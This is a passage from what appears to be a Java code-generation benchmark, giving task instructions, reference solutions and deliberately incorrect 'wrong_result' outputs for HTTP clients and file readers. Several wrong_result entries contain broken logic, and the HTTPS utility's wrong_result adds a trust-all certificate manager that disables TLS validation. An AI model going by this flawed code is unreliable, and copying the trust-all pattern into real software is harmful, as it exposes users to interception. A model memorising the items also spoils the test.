    "wrong_result": "public class OsmInputFile {\n    private final Path path;\n    private final boolean lazy;\n\n    public OsmInputFile(Path path, boolean lazy) {\n        this.path = path;\n        this.lazy = lazy;\n    }\n\n    private int readInt(FileChannel channel) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(4);\n        channel.read(buffer);\n        buffer.flip();\n        return buffer.getInt();\n    }\n\n    private byte[] readBytes(FileChannel channel, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(length);\n        channel.read(buffer);\n        return buffer.array();\n    }\n\n    private byte[] readBytes(FileChannel channel, long offset, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(length);\n        channel.read(buffer, offset);\n        return buffer.array();\n    }\n\n    private BlobHeader readBlobHeader(FileChannel channel) throws IOException {\n        int headerSize = readInt(channel);\n        byte[] headerBytes = readBytes(channel, headerSize);\n        return BlobHeader.parseFrom(headerBytes);\n    }\n\n    private FileChannel openChannel() throws IOException {\n        return FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public class LazyReader {\n        private final FileChannel channel;\n\n        public LazyReader() throws IOException {\n            this.channel = openChannel();\n        }\n\n        public void forEachBlock(Consumer<Block> consumer) throws IOException {\n            long fileSize = channel.size();\n            long position = 0;\n\n            while (position < fileSize) {\n                BlobHeader header = readBlobHeader(channel);\n                long offset = position;\n                int length = header.getSerializedSize();\n                position += length + 4; // Include the header size and the 4-byte length field\n\n                LazyBlock block = new LazyBlock(offset, length, channel);\n                consumer.accept(block);\n            }\n        }\n\n        public void close() throws IOException {\n            channel.close();\n        }\n\n        private record LazyBlock(long offset, int length, FileChannel channel) implements Block {\n            private byte[] data;\n\n            private byte[] getData() throws IOException {\n                if (data == null) {\n                    data = readBytes(channel, offset, length);\n                }\n                return data;\n            }\n\n            @Override\n            public Iterable<OsmElement> decodeElements() throws IOException {\n                byte[] data = getData();\n                return OsmElementParser.parse(data);\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Implement a custom HTTP data source for streaming media that handles connection management, redirects, and error handling, specifically designed for YouTube video streaming.\n\nClass Description: YoutubeHttpDataSource is a custom HTTP data source implementation that extends BaseDataSource and implements HttpDataSource interface. It provides functionality for opening and closing HTTP connections, handling redirects, and managing input streams for media streaming.\n\nAttributes:\n\nallowCrossProtocolRedirects: boolean - Determines whether cross-protocol redirects (HTTP to HTTPS or vice versa) are allowed\nconnectTimeoutMillis: int - Connection timeout in milliseconds\nreadTimeoutMillis: int - Read timeout in milliseconds\nrequestProperties: RequestProperties - Contains HTTP request headers and properties\ndataSpec: DataSpec - Contains information about the data to be read\nconnection: HttpURLConnection - The active HTTP connection\ninputStream: InputStream - The input stream for reading data\nopened: boolean - Flag indicating whether the data source is currently open\n\nMethods:\n\nopen(DataSpec dataSpecParameter) -> long - Opens the data source for the specified DataSpec and returns the length of the data\nmakeConnection(DataSpec dataSpecToUse) -> HttpURLConnection - Creates and configures an HTTP connection, handling redirects\nopenConnection(URL url) -> HttpURLConnection - Opens a basic HTTP connection to the specified URL\nhandleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) -> URL - Handles HTTP redirects and returns the new URL\nclose() -> void - Closes the data source and releases all resources\nmaybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) -> void - Helper method to terminate input streams on specific Android versions\ncloseConnectionQuietly() -> void - Safely closes the current connection without throwing exceptions",
    "Canonical_solution": "import com.google.android.exoplayer2.C;\nimport com.google.android.exoplayer2.PlaybackException;\nimport com.google.android.exoplayer2.upstream.DataSource;\nimport com.google.android.exoplayer2.upstream.DataSpec;\nimport com.google.android.exoplayer2.upstream.HttpDataSource;\nimport com.google.android.exoplayer2.util.Util;\n\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.lang.reflect.Method;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.NoRouteToHostException;\nimport java.net.URL;\nimport java.util.Map;\n\npublic final class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n\n    private static final int MAX_REDIRECTS = 20;\n    private static final int HTTP_STATUS_TEMPORARY_REDIRECT = 307;\n    private static final int HTTP_STATUS_PERMANENT_REDIRECT = 308;\n    private static final long MAX_BYTES_TO_DRAIN = 2048;\n\n    private final boolean allowCrossProtocolRedirects;\n    private final int connectTimeoutMillis;\n    private final int readTimeoutMillis;\n    private final RequestProperties requestProperties;\n\n    @Nullable\n    private DataSpec dataSpec;\n    @Nullable\n    private HttpURLConnection connection;\n    @Nullable\n    private InputStream inputStream;\n    private boolean opened;\n\n    @Override\n    public long open(@NonNull final DataSpec dataSpecParameter) throws HttpDataSourceException {\n        this.dataSpec = dataSpecParameter;\n        transferInitializing(dataSpecParameter);\n\n        try {\n            this.connection = makeConnection(dataSpec);\n            final HttpURLConnection httpURLConnection = this.connection;\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String responseMessage = httpURLConnection.getResponseMessage();\n\n            if (responseCode < 200 || responseCode > 299) {\n                throw new InvalidResponseCodeException(responseCode, responseMessage, null,\n                        httpURLConnection.getHeaderFields(), dataSpec, Util.EMPTY_BYTE_ARRAY);\n            }\n\n            inputStream = httpURLConnection.getInputStream();\n            opened = true;\n            transferStarted(dataSpecParameter);\n            return dataSpecParameter.length != C.LENGTH_UNSET ? dataSpecParameter.length : 0;\n        } catch (final IOException e) {\n            closeConnectionQuietly();\n            throw HttpDataSourceException.createForIOException(e, dataSpec,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @NonNull\n    private HttpURLConnection makeConnection(@NonNull final DataSpec dataSpecToUse)\n            throws IOException {\n        URL url = new URL(dataSpecToUse.uri.toString());\n        int redirectCount = 0;\n\n        while (redirectCount++ <= MAX_REDIRECTS) {\n            final HttpURLConnection httpURLConnection = openConnection(url);\n            httpURLConnection.setConnectTimeout(connectTimeoutMillis);\n            httpURLConnection.setReadTimeout(readTimeoutMillis);\n\n            for (final Map.Entry<String, String> property : requestProperties.getSnapshot().entrySet()) {\n                httpURLConnection.setRequestProperty(property.getKey(), property.getValue());\n            }\n\n            httpURLConnection.setInstanceFollowRedirects(false);\n            httpURLConnection.setDoOutput(true);\n            httpURLConnection.connect();\n\n            final int responseCode = httpURLConnection.getResponseCode();\n            final String location = httpURLConnection.getHeaderField(\"Location\");\n            if (responseCode == HttpURLConnection.HTTP_MOVED_PERM\n                    || responseCode == HttpURLConnection.HTTP_MOVED_TEMP\n                    || responseCode == HttpURLConnection.HTTP_SEE_OTHER\n                    || responseCode == HTTP_STATUS_TEMPORARY_REDIRECT\n                    || responseCode == HTTP_STATUS_PERMANENT_REDIRECT) {\n                httpURLConnection.disconnect();\n                url = handleRedirect(url, location, dataSpecToUse);\n            } else {\n                return httpURLConnection;\n            }\n        }\n\n        throw new HttpDataSourceException(\n                new NoRouteToHostException(\"Too many redirects: \" + redirectCount),\n                dataSpecToUse,\n                PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                HttpDataSourceException.TYPE_OPEN);\n    }\n\n    private HttpURLConnection openConnection(@NonNull final URL url) throws IOException {\n        return (HttpURLConnection) url.openConnection();\n    }\n\n    @NonNull\n    private URL handleRedirect(final URL originalUrl,\n                             @Nullable final String location,\n                             final DataSpec dataSpecToHandleRedirect)\n            throws HttpDataSourceException {\n        if (location == null) {\n            throw new HttpDataSourceException(\"Null location redirect\", dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n\n        try {\n            URL url = new URL(originalUrl, location);\n            String protocol = url.getProtocol();\n            if (!\"https\".equals(protocol) && !\"http\".equals(protocol)) {\n                throw new HttpDataSourceException(\"Unsupported protocol redirect: \" + protocol,\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            if (!allowCrossProtocolRedirects && !protocol.equals(originalUrl.getProtocol())) {\n                throw new HttpDataSourceException(\n                        \"Disallowed cross-protocol redirect (\"\n                                + originalUrl.getProtocol()\n                                + \" to \"\n                                + protocol\n                                + \")\",\n                        dataSpecToHandleRedirect,\n                        PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                        HttpDataSourceException.TYPE_OPEN);\n            }\n            return url;\n        } catch (final MalformedURLException e) {\n            throw new HttpDataSourceException(e, dataSpecToHandleRedirect,\n                    PlaybackException.ERROR_CODE_IO_NETWORK_CONNECTION_FAILED,\n                    HttpDataSourceException.TYPE_OPEN);\n        }\n    }\n\n    @Override\n    public void close() throws HttpDataSourceException {\n        try {\n            if (inputStream != null) {\n                maybeTerminateInputStream(connection, C.LENGTH_UNSET);\n                try {\n                    inputStream.close();\n                } catch (final IOException e) {\n                    throw new HttpDataSourceException(e, castNonNull(dataSpec),\n                            PlaybackException.ERROR_CODE_IO_UNSPECIFIED,\n                            HttpDataSourceException.TYPE_CLOSE);\n                }\n            }\n        } finally {\n            inputStream = null;\n            closeConnectionQuietly();\n            if (opened) {\n                opened = false;\n                transferEnded();\n            }\n        }\n    }\n\n    private static void maybeTerminateInputStream(@Nullable final HttpURLConnection connection,\n                                                final long bytesRemaining) {\n        if (connection == null || Util.SDK_INT < 19 || Util.SDK_INT > 20) {\n            return;\n        }\n\n        try {\n            InputStream inputStream = connection.getInputStream();\n            String className = inputStream.getClass().getName();\n            if (\"com.android.okhttp.internal.http.HttpTransport$ChunkedInputStream\".equals(className)\n                    || \"com.android.okhttp.internal.http.HttpTransport$FixedLengthInputStream\".equals(className)) {\n                Class<?> superclass = inputStream.getClass().getSuperclass();\n                Method unexpectedEndOfInput = checkNotNull(superclass).getDeclaredMethod(\"unexpectedEndOfInput\");\n                unexpectedEndOfInput.setAccessible(true);\n                unexpectedEndOfInput.invoke(inputStream);\n            }\n        } catch (final Exception e) {\n            // Ignore\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        if (connection != null) {\n            try {\n                connection.disconnect();\n            } catch (final Exception e) {\n                // Ignore\n            }\n            connection = null;\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "public class YoutubeHttpDataSource extends BaseDataSource implements HttpDataSource {\n    private boolean allowCrossProtocolRedirects;\n    private int connectTimeoutMillis;\n    private int readTimeoutMillis;\n    private RequestProperties requestProperties;\n    private DataSpec dataSpec;\n    private HttpURLConnection connection;\n    private InputStream inputStream;\n    private boolean opened;\n\n    public long open(DataSpec dataSpecParameter) {\n        this.dataSpec = dataSpecParameter;\n        this.opened = true;\n        return openConnection(dataSpec.uri).getContentLength();\n    }\n\n    private HttpURLConnection makeConnection(DataSpec dataSpecToUse) throws IOException {\n        URL url = new URL(dataSpecToUse.uri);\n        HttpURLConnection connection = openConnection(url);\n        connection.setConnectTimeout(connectTimeoutMillis);\n        connection.setReadTimeout(readTimeoutMillis);\n        for (Map.Entry<String, String> entry : requestProperties.headers.entrySet()) {\n            connection.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 300 && responseCode < 400) {\n            String location = connection.getHeaderField(\"Location\");\n            if (location != null) {\n                URL newUrl = handleRedirect(url, location, dataSpecToUse);\n                return makeConnection(new DataSpec(newUrl.toString()));\n            }\n        }\n        return connection;\n    }\n\n    private HttpURLConnection openConnection(URL url) throws IOException {\n        return (HttpURLConnection) url.openConnection();\n    }\n\n    private URL handleRedirect(URL originalUrl, String location, DataSpec dataSpecToHandleRedirect) throws IOException {\n        URL newUrl = new URL(location);\n        if (!newUrl.getProtocol().equals(originalUrl.getProtocol()) && !allowCrossProtocolRedirects) {\n            throw new IOException(\"Cross-protocol redirect not allowed\");\n        }\n        return newUrl;\n    }\n\n    public void close() {\n        closeConnectionQuietly();\n        opened = false;\n    }\n\n    private void maybeTerminateInputStream(HttpURLConnection connection, long bytesRemaining) {\n        if (bytesRemaining == 0 && Build.VERSION.SDK_INT <= Build.VERSION_CODES.M) {\n            try {\n                connection.getInputStream().close();\n            } catch (IOException e) {\n                // Ignore\n            }\n        }\n    }\n\n    private void closeConnectionQuietly() {\n        try {\n            if (connection != null) {\n                connection.disconnect();\n            }\n        } catch (Exception e) {\n            // Ignore\n        }\n    }\n}"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Java utility class for making HTTPS requests using HttpURLConnection with custom SSL socket factory configuration.\n\nClass Description: HttpClientUtil is a utility class that provides methods for making HTTPS requests with custom SSL/TLS configuration. It handles both GET and POST methods, manages connection settings, and includes proper error handling and resource cleanup.\n\nAttributes: (None - this is a utility class with only static methods)\n\nMethods:\n\nMethod1: httpsRequest(String requestUrl, String method, String outputStr) -> HttpResponse - Makes an HTTPS request to the specified URL using the given HTTP method. Handles request body for POST methods and returns the server response.\n\nMethod2: httpsRequest2(String requestUrl, String method, String outputStr) -> HttpResponse - Alternative implementation that uses a different URL constructor with protocol handler, otherwise similar to httpsRequest.\n\nMethod3: createSSLSocketFactory() -> SSLSocketFactory - Private helper method that creates and configures an SSLSocketFactory with custom TrustManager for SSL/TLS connections. Throws IOException if SSL context creation fails.\n\nInput Parameters:\n- requestUrl: String - The HTTPS URL to connect to\n- method: String - HTTP method (GET/POST)\n- outputStr: String - Request body content (for POST requests)\n\nOutput:\n- Returns HttpResponse object containing the server response\n- Throws IOException for connection or SSL configuration errors",
    "Canonical_solution": "import javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.net.URL;\nimport java.security.KeyManagementException;\nimport java.security.NoSuchAlgorithmException;\nimport java.security.NoSuchProviderException;\n\npublic class HttpClientUtil {\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(requestUrl);\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws IOException {\n        HttpsURLConnection connection = null;\n        try {\n            SSLSocketFactory ssf = createSSLSocketFactory();\n            URL url = new URL(null, requestUrl, new sun.net.www.protocol.https.Handler());\n            connection = (HttpsURLConnection) url.openConnection();\n            connection.setSSLSocketFactory(ssf);\n            connection.setDoOutput(true);\n            connection.setDoInput(true);\n            connection.setUseCaches(false);\n            connection.setRequestMethod(method);\n            \n            if (\"GET\".equalsIgnoreCase(method)) {\n                connection.connect();\n            }\n\n            if (null != outputStr) {\n                OutputStream outputStream = connection.getOutputStream();\n                outputStream.write(outputStr.getBytes(\"UTF-8\"));\n                outputStream.close();\n            }\n            return new HttpResponse(connection);\n        } catch (IOException e) {\n            if (connection != null) {\n                connection.disconnect();\n            }\n            throw e;\n        }\n    }\n\n    private static SSLSocketFactory createSSLSocketFactory() throws IOException {\n        try {\n            TrustManager[] tm = { new MyX509TrustManager() };\n            SSLContext sslContext = SSLContext.getInstance(\"SSL\", \"SunJSSE\");\n            sslContext.init(null, tm, new java.security.SecureRandom());\n            return sslContext.getSocketFactory();\n        } catch (NoSuchAlgorithmException | NoSuchProviderException e) {\n            throw new IOException(\"\u5b9e\u4f8b\u5316SSLContext\u5931\u8d25\", e);\n        } catch (KeyManagementException e) {\n            throw new IOException(\"\u521d\u59cb\u5316SSLContext\u5931\u8d25\", e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport javax.net.ssl.SSLSocketFactory;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\n\npublic class HttpClientUtil {\n    public static class HttpResponse {\n        public int statusCode;\n        public String content;\n\n        public HttpResponse(int statusCode, String content) {\n            this.statusCode = statusCode;\n            this.content = content;\n        }\n    }\n\n    public static HttpResponse httpsRequest(String requestUrl, String method, String outputStr) throws Exception {\n        URL url = new URL(requestUrl);\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(method);\n        conn.setDoOutput(true);\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n\n        if (outputStr != null) {\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = outputStr.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        StringBuilder response = new StringBuilder();\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"utf-8\"))) {\n            String responseLine;\n            while ((responseLine = br.readLine()) != null) {\n                response.append(responseLine.trim());\n            }\n        }\n\n        return new HttpResponse(responseCode, response.toString());\n    }\n\n    public static HttpResponse httpsRequest2(String requestUrl, String method, String outputStr) throws Exception {\n        URL url = new URL(null, requestUrl, new sun.net.www.protocol.https.Handler());\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setRequestMethod(method);\n        conn.setDoOutput(true);\n        conn.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        conn.setRequestProperty(\"User-Agent\", \"Mozilla/5.0\");\n\n        if (outputStr != null) {\n            try (OutputStream os = conn.getOutputStream()) {\n                byte[] input = outputStr.getBytes(\"utf-8\");\n                os.write(input, 0, input.length);\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        StringBuilder response = new StringBuilder();\n\n        try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream(), \"utf-8\"))) {\n            String responseLine;\n            while ((responseLine = br.readLine()) != null) {\n                response.append(responseLine.trim());\n            }\n        }\n\n        return new HttpResponse(responseCode, response.toString());\n    }\n\n    private static SSLSocketFactory createSSLSocketFactory() throws Exception {\n        TrustManager[] trustAllCerts = new TrustManager[]{new X509TrustManager() {\n            public java.security.cert.X509Certificate[] getAcceptedIssuers() {\n                return new java.security.cert.X509Certificate[0];\n            }\n\n            public void checkClientTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n            }\n\n            public void checkServerTrusted(java.security.cert.X509Certificate[] certs, String authType) {\n            }\n        }};\n\n        javax.net.ssl.SSLContext sslContext = javax.net.ssl.SSLContext.getInstance(\"TLS\");\n        sslContext.init(null, trustAllCerts, new java.security.SecureRandom());\n        return sslContext.getSocketFactory();\n    }\n}"
  },
  {
    "Task_id": 119,
    "Instruction": "Task Description: Create a Java class that implements an HTTP client using Netty framework for making GET and POST requests to a remote server, with support for timeout handling and asynchronous response processing.\n\nClass Description: TestHttpClient is a Netty-based HTTP client that handles both GET and POST requests asynchronously. It manages connection pooling, request/response processing, and timeout handling. The class uses Netty's event-driven architecture for efficient network communication.\n\nAttributes:\n- host: String - The target server hostname or IP address\n- port: int - The target server port number\n- defaultTimeout: int - Default timeout in milliseconds for request completion\n- workerGroup: NioEventLoopGroup - Netty event loop group for handling I/O operations\n- b: Bootstrap - Netty bootstrap for client configuration\n- results: ConcurrentHashMap<String, CompletableFuture<String>> - Map for tracking pending requests and their futures\n\nMethods:\n- init(): void - Initializes the Netty client configuration including pipeline setup\n- close(): void - Shuts down the client gracefully and releases resources\n- get(String uri) -> String - Sends an HTTP GET request to the specified URI\n- post(String uri, Map<String, String> params, Map<String, String> headers) -> String - Sends an HTTP POST request with parameters and headers\n- send(HttpRequest request) -> String - Internal method for sending requests and handling responses",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.http.*;\nimport io.netty.handler.codec.http.multipart.DefaultHttpDataFactory;\nimport io.netty.handler.codec.http.multipart.HttpPostRequestEncoder;\nimport io.netty.util.CharsetUtil;\n\nimport java.net.URI;\nimport java.util.Map;\nimport java.util.concurrent.CompletableFuture;\nimport java.util.concurrent.ConcurrentHashMap;\nimport java.util.concurrent.TimeUnit;\n\npublic class TestHttpClient {\n    private String host;\n    private int port;\n    private int defaultTimeout;\n    private EventLoopGroup workerGroup;\n    private Bootstrap b;\n    private Map<String, CompletableFuture<String>> results = new ConcurrentHashMap<>();\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        init();\n    }\n\n    private void init() {\n        b = new Bootstrap();\n        workerGroup = new NioEventLoopGroup();\n        b.group(workerGroup).channel(NioSocketChannel.class).handler(new ChannelInitializer<SocketChannel>() {\n            @Override\n            public void initChannel(SocketChannel ch) throws Exception {\n                ch.pipeline().addLast(\"http-decoder\", new HttpResponseDecoder());\n                ch.pipeline().addLast(\"http-encoder\", new HttpRequestEncoder());\n                ch.pipeline().addLast(\"http-aggregator\", new HttpObjectAggregator(1024 * 1024));\n                ch.pipeline().addLast(\"clientHandler\", new SimpleChannelInboundHandler<FullHttpResponse>() {\n                    protected void channelRead0(final ChannelHandlerContext ctx, final FullHttpResponse httpResponse) {\n                        CompletableFuture<String> future = results.get(ctx.channel().id().asLongText());\n                        if (future != null) {\n                            future.complete(httpResponse.content().toString(CharsetUtil.UTF_8));\n                        }\n                    }\n                });\n            }\n        });\n    }\n\n    public void close() {\n        if (workerGroup != null) {\n            workerGroup.shutdownGracefully();\n            workerGroup = null;\n        }\n        results.clear();\n    }\n\n    public String get(String uri) throws Exception {\n        DefaultHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, new URI(uri).toASCIIString());\n        return send(request);\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) throws Exception {\n        HttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, new URI(uri).toASCIIString());\n        if (params != null && !params.isEmpty()) {\n            HttpPostRequestEncoder encoder = new HttpPostRequestEncoder(new DefaultHttpDataFactory(), request, false);\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                encoder.addBodyAttribute(entry.getKey(), entry.getValue());\n            }\n            request = encoder.finalizeRequest();\n        }\n        if (headers != null) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                request.headers().set(entry.getKey(), entry.getValue());\n            }\n        }\n        return send(request);\n    }\n\n    private String send(HttpRequest request) throws Exception {\n        ChannelFuture f = b.connect(host, port).sync();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(f.channel().id().asLongText(), future);\n        String result;\n        try {\n            f.channel().writeAndFlush(request).sync();\n            result = future.get(defaultTimeout, TimeUnit.MILLISECONDS);\n        } finally {\n            results.remove(f.channel().id().asLongText());\n            f.channel().closeFuture().sync();\n        }\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class TestHttpClient {\n    private final String host;\n    private final int port;\n    private final int defaultTimeout;\n    private final NioEventLoopGroup workerGroup;\n    private final Bootstrap b;\n    private final ConcurrentHashMap<String, CompletableFuture<String>> results;\n\n    public TestHttpClient(String host, int port, int defaultTimeout) {\n        this.host = host;\n        this.port = port;\n        this.defaultTimeout = defaultTimeout;\n        this.workerGroup = new NioEventLoopGroup();\n        this.b = new Bootstrap();\n        this.results = new ConcurrentHashMap<>();\n    }\n\n    public void init() {\n        b.group(workerGroup)\n         .channel(NioSocketChannel.class)\n         .handler(new ChannelInitializer<SocketChannel>() {\n             @Override\n             public void initChannel(SocketChannel ch) {\n                 ChannelPipeline p = ch.pipeline();\n                 p.addLast(new HttpClientCodec());\n                 p.addLast(new HttpObjectAggregator(1048576));\n                 p.addLast(new TestHttpClientHandler(results));\n             }\n         });\n    }\n\n    public void close() {\n        workerGroup.shutdownGracefully();\n    }\n\n    public String get(String uri) {\n        return send(new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.GET, uri));\n    }\n\n    public String post(String uri, Map<String, String> params, Map<String, String> headers) {\n        FullHttpRequest request = new DefaultFullHttpRequest(HttpVersion.HTTP_1_1, HttpMethod.POST, uri);\n        if (params != null && !params.isEmpty()) {\n            StringBuilder sb = new StringBuilder();\n            for (Map.Entry<String, String> entry : params.entrySet()) {\n                if (sb.length() > 0) sb.append(\"&\");\n                sb.append(entry.getKey()).append(\"=\").append(entry.getValue());\n            }\n            request.content().writeBytes(sb.toString().getBytes(CharsetUtil.UTF_8));\n        }\n        if (headers != null && !headers.isEmpty()) {\n            for (Map.Entry<String, String> entry : headers.entrySet()) {\n                request.headers().set(entry.getKey(), entry.getValue());\n            }\n        }\n        return send(request);\n    }\n\n    private String send(HttpRequest request) {\n        String requestId = UUID.randomUUID().toString();\n        CompletableFuture<String> future = new CompletableFuture<>();\n        results.put(requestId, future);\n        request.headers().set(\"Host\", host);\n        request.headers().set(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        request.headers().set(\"Connection\", \"close\");\n        ChannelFuture channelFuture = b.connect(host, port);\n        channelFuture.addListener((ChannelFutureListener) f -> {\n            if (f.isSuccess()) {\n                Channel channel = f.channel();\n                channel.writeAndFlush(request);\n                channel.closeFuture().addListener((ChannelFutureListener) closeFuture -> {\n                    if (closeFuture.isSuccess()) {\n                        future.complete(\"Request completed successfully\");\n                    } else {\n                        future.completeExceptionally(new RuntimeException(\"Request failed\"));\n                    }\n                });\n            } else {\n                future.completeExceptionally(new RuntimeException(\"Failed to connect to server\"));\n            }\n        });\n        try {\n            return future.get(defaultTimeout, TimeUnit.MILLISECONDS).toString();\n        } catch (Exception e) {\n            return \"Error: \" + e.getMessage();\n        }\n    }\n\n    private static class TestHttpClientHandler extends SimpleChannelInboundHandler<HttpObject> {\n        private final ConcurrentHashMap<String, CompletableFuture<String>> results;\n\n        public TestHttpClientHandler(ConcurrentHashMap<String, CompletableFuture<String>> results) {\n            this.results = results;\n        }\n\n        @Override\n        protected void channelRead0(ChannelHandlerContext ctx, HttpObject msg) {\n            if (msg instanceof HttpResponse) {\n                HttpResponse response = (HttpResponse) msg;\n                System.out.println(\"Status: \" + response.status());\n            }\n            if (msg instanceof HttpContent) {\n                HttpContent content = (HttpContent) msg;\n                ByteBuf buf = content.content();\n                String responseStr = buf.toString(CharsetUtil.UTF_8);\n                System.out.println(\"Response: \" + responseStr);\n                if (results.containsKey(\"requestId\")) {\n                    results.get(\"requestId\").complete(responseStr);\n                }\n                ctx.close();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n}"
  },
  {
    "Task_id": 12,
    "Instruction": "Task Description: Create a Java class that provides functionality for interacting with files using Java NIO's FileChannel and memory-mapped file operations. The class should support opening files, mapping files to memory, accessing mapped buffers, forcing writes to disk, and properly closing resources.\n\nClass Description: The FileChannelInteractor class encapsulates operations for file channel interaction and memory-mapped file operations using Java NIO. It provides methods to open files, map file regions to memory, access mapped buffers, ensure data persistence, and clean up resources.\n\nAttributes:\nfileChannel: FileChannel - The FileChannel instance used for file operations\nmappedBuffer: MappedByteBuffer - The buffer representing the memory-mapped file region\n\nMethods:\nopenFileChannel: openFileChannel(String filePath) -> void - Opens a FileChannel for reading the specified file. Throws IOException if the file cannot be opened.\nmapFileToMemory: mapFileToMemory(long position, long size) -> void - Maps a region of the file into memory for read-only access. Throws IOException if mapping fails.\ngetMappedBuffer: getMappedBuffer() -> MappedByteBuffer - Returns the currently mapped byte buffer.\ncloseChannel: closeChannel() -> void - Closes the FileChannel and releases associated resources. Throws IOException if closing fails.\nforceWriteToDisk: forceWriteToDisk() -> void - Forces any changes made to the mapped buffer to be written to disk (though in this implementation the buffer is read-only).",
    "Canonical_solution": "import java.io.IOException;\nimport java.nio.channels.FileChannel;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardOpenOption;\nimport java.nio.MappedByteBuffer;\nimport java.nio.file.Path;\n\npublic class FileChannelInteractor {\n    private FileChannel fileChannel;\n    private MappedByteBuffer mappedBuffer;\n\n    public void openFileChannel(String filePath) throws IOException {\n        Path path = Paths.get(filePath);\n        this.fileChannel = FileChannel.open(path, StandardOpenOption.READ);\n    }\n\n    public void mapFileToMemory(long position, long size) throws IOException {\n        this.mappedBuffer = fileChannel.map(FileChannel.MapMode.READ_ONLY, position, size);\n    }\n\n    public MappedByteBuffer getMappedBuffer() {\n        return this.mappedBuffer;\n    }\n\n    public void closeChannel() throws IOException {\n        if (this.fileChannel != null) {\n            this.fileChannel.close();\n        }\n    }\n\n    public void forceWriteToDisk() {\n        if (this.mappedBuffer != null) {\n            this.mappedBuffer.force();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
